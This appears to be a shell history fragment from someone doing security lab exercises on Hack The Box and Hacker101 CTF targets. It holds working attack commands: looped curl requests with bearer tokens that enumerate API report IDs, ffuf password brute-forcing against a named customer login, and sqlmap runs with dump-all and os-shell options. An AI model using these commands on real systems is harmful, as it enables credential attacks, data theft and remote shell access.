+  964  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
+  965  done
+  966  '
+  967  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw'
+  968  done
+  969  code htb-api.sh
+  970  clear
+  971  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw"; done
+  972  clear
+  973  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw"; done
+  974  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  975  sudo apt install q
+  976  sudo apt install jq
+  977  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  978  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  979  for ((i=1; i<= 20; i++)); do curl -v -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  980  clear
+  981  for ((i=1; i<= 20; i++)); do curl -v -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  982  ip addr
+  983  for ((i=1; i<= 20; i++)); do curl -v -w "\n" -X 'GET'   'http://94.237.58.173:48496/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTMzOTc1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.C-56uWoOl2G3z20xRHbhgj26XecGmXidHa_r1nyZBV3UNegO1jQfFjbTRVON1BPWyMsWdO3Z4wicT6LuTEftMQ'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw" | jq; done
+  984  arp -a
+  985  sudo apt install arp
+  986  sudo apt search arp
+  987  sudo apt search net-tools
+  988  sudo apt install net-tools
+  989  arp -a
+  990  which arp
+  991  locate arp
+  992  which net-tools
+  993  echo $PATH
+  994  ls /usr/sbin/nclear
+  995  clear
+  996  sudo apt search net-tools
+  997  sudo apt install net-tools
+  998  sudo find / -name arp
+  999  echo 'export PATH=$PATH:/usr/sbin' >> ~/.bashrc
+ 1000  source ~/.bashrc
+ 1001  arp
+ 1002  clear
+ 1003  arp -a
+ 1004  clear
+ 1005  for ((i=1; i<= 20; i++)); do curl -v -w "\n" -X 'GET'   'http://94.237.58.173:47811/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTM0NTEzNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.S7RrGY7MFB_jhKLFpnbLn-9MUXNW9y5igCwMYlyQrylvVje8XQ1-dCsOlDNupBuOFXM0KeV-tESywL72ommiqw" | jq; done
+ 1006  clear
+ 1007  for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://94.237.58.173:47811/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTM0NTEzNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.S7RrGY7MFB_jhKLFpnbLn-9MUXNW9y5igCwMYlyQrylvVje8XQ1-dCsOlDNupBuOFXM0KeV-tESywL72ommiqw" | jq; done
+ 1008  clear
+ 1009  ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1010  ffuf -w /opt/useful/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1011  ffuf -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1012  ffuf -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1013  ffuf -w /usr/share/wordlists/seclists/Passwords/ :PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1014  find / rockyou.txt
+ 1015  history | grep find
+ 1016  sudo find / -name rockyou.txt
+ 1017  gunzip /usr/share/wordlists/rockyou.txt.gz
+ 1018  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+ 1019  ffuf -w /usr/share/wordlists/rockyou.txt:PASS -u http://94.237.58.173:47811/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+ 1020  history
+ 1021  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --batch --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell
+ 1022  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell
+ 1023  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10
+ 1024  clear
+ 1025  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10
+ 1026  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10 --batch
+ 1027  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10
